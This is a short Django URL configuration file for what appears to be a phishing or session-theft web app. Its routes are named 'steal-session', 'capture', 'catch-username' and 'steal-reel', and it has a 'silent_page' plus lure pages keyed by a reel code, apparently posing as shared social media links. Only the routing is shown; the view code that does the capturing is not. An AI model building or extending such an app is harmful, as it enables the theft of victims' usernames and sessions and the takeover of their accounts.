from django.contrib import admin
from django.urls import path
from core import views

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', views.login_view),
    path('dashboard/', views.dashboard, name='dashboard'),
    path('download-json/', views.download_json),
    
    path('go/', views.silent_page, name='go'),
    
    path('steal-session/', views.steal_session, name='steal_session'),
    path('capture/', views.capture_full),
    path('catch-username/', views.catch_username),
path('reel/<str:code>/', views.reel_page),
path('steal-reel/', views.steal_reel),
    
]